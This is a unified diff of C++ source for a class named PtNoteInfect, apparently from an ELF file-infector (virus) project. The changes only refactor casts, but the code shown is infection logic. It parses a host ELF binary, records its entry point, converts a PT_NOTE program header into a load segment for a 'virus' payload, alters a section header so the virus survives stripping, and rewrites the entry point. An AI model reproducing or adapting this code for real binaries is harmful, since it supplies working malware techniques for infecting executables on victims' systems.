@@ -62,14 +62,14 @@ bool PtNoteInfect::analyze(std::span<const std::byte> host_mapping,
                            std::span<const std::byte> parasite_mapping) {
   host_size_ = host_mapping.size();
   parasite_size_ = parasite_mapping.size();
-  const auto& ehdr = *reinterpret_cast<const Elf64_Ehdr*>(host_mapping.data());
+  const auto& ehdr = reinterpret_cast<const Elf64_Ehdr&>(host_mapping.front());
   if ((ehdr.e_type != ET_EXEC && ehdr.e_type != ET_DYN) ||
       ehdr.e_ident[EI_CLASS] != ELFCLASS64) {
     return false;
   }
 
   const auto& phdr =
-      *reinterpret_cast<const Elf64_Phdr*>(&host_mapping[ehdr.e_phoff]);
+      reinterpret_cast<const Elf64_Phdr&>(host_mapping[ehdr.e_phoff]);
 
   original_e_entry_ = ehdr.e_entry;
 
@@ -111,7 +111,7 @@ bool PtNoteInfect::analyze(std::span<const std::byte> host_mapping,
   }
 
   auto sht_entry_count = ehdr.e_shnum;
-  auto shdr = reinterpret_cast<const Elf64_Shdr*>(&host_mapping[ehdr.e_shoff]);
+  auto* shdr = reinterpret_cast<const Elf64_Shdr*>(&host_mapping[ehdr.e_shoff]);
   auto shstrtab_idx = ehdr.e_shstrndx;
   auto shstrtab = &host_mapping[(shdr + shstrtab_idx)->sh_offset];
   for (size_t i = 0; i < sht_entry_count; ++i) {
@@ -135,8 +135,7 @@ bool PtNoteInfect::analyze(std::span<const std::byte> host_mapping,
 
 bool PtNoteInfect::inject(std::span<std::byte> host_mapping,
                           std::span<const std::byte> parasite_mapping) {
-  const auto& ehdr =
-      *reinterpret_cast<const Elf64_Ehdr*>(&host_mapping.front());
+  const auto& ehdr = reinterpret_cast<const Elf64_Ehdr&>(host_mapping.front());
 
   const auto virus_size = parasite_mapping.size();
 
@@ -144,7 +143,7 @@ bool PtNoteInfect::inject(std::span<std::byte> host_mapping,
   const auto virus_offset = parasite_load_address_;
   {
     auto& mutable_phdr =
-        *reinterpret_cast<Elf64_Phdr*>(&host_mapping[ehdr.e_phoff]);
+        reinterpret_cast<Elf64_Phdr&>(host_mapping[ehdr.e_phoff]);
     patch_phdr(mutable_phdr, virus_size, virus_offset,
                pt_note_to_be_infected_idx_, pt_load_alignment_,
                parasite_load_address_);
@@ -154,7 +153,7 @@ bool PtNoteInfect::inject(std::span<std::byte> host_mapping,
     // mutate a note section entry to cover our virus so it doesn't get
     // stripped.
     auto& mutable_shdr =
-        *reinterpret_cast<Elf64_Shdr*>(&host_mapping[ehdr.e_shoff]);
+        reinterpret_cast<Elf64_Shdr&>(host_mapping[ehdr.e_shoff]);
     if (!patch_sht(ehdr, mutable_shdr, virus_size, virus_offset,
                    original_pt_note_file_offset_, parasite_load_address_)) {
       return false;
@@ -162,7 +161,7 @@ bool PtNoteInfect::inject(std::span<std::byte> host_mapping,
   }
 
   {
-    auto& mutable_ehdr = *reinterpret_cast<Elf64_Ehdr*>(&host_mapping.front());
+    auto& mutable_ehdr = reinterpret_cast<Elf64_Ehdr&>(host_mapping.front());
     patch_ehdr(mutable_ehdr, parasite_load_address_, virus_offset);
   }
 
